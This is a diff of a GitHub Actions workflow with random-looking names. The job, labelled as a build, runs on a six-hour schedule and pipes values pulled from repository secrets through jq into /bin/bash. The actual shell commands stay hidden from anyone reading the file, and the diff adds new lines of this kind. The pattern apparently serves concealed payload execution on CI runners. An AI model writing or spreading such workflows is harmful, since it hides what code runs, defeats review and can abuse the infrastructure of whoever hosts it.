@@ -3,7 +3,7 @@ name: chumaitian3189
 on:
   workflow_dispatch:
   schedule:
-    - cron: '3 4/6 * * *'
+    - cron: '44 3/6 * * *'
 
 jobs:
   build:
@@ -13,16 +13,12 @@ jobs:
       - uses: actions/checkout@v4
       - name: chumaitian3189
         env:
-          gdpbh5192: ${{ secrets.gdpbh5192 }}
+          ci1947: ${{ secrets.ci1947 }}
         run: |
-          echo $gdpbh5192 | jq -r .gzh04 | /bin/bash
-          echo $zdc149 | jq -r .xb5216 | /bin/bash
-          echo $or985 | jq -r .mfa211 | /bin/bash
-          echo $qy62300 | jq -r .vbnu4 | /bin/bash
-          echo $qs941 | jq -r .qcrpf51713 | /bin/bash
-          echo $l811 | jq -r .sx942 | /bin/bash
-          echo $kvjbl9901 | jq -r .tcn55 | /bin/bash
-          echo $uk225 | jq -r .sw9734 | /bin/bash
-          echo $gccq073 | jq -r .ashsh79998 | /bin/bash
-          echo $iqnfg8871 | jq -r .a7764 | /bin/bash
+          echo $ci1947 | jq -r .ymk54145 | /bin/bash
+          echo $rttik059 | jq -r .bf9 | /bin/bash
+          echo $jf38153 | jq -r .sb3870 | /bin/bash
+          echo $bqi665 | jq -r .xf828 | /bin/bash
+          echo $p46034 | jq -r .ake670 | /bin/bash
+          echo $nisyl857 | jq -r .zluy36 | /bin/bash
 
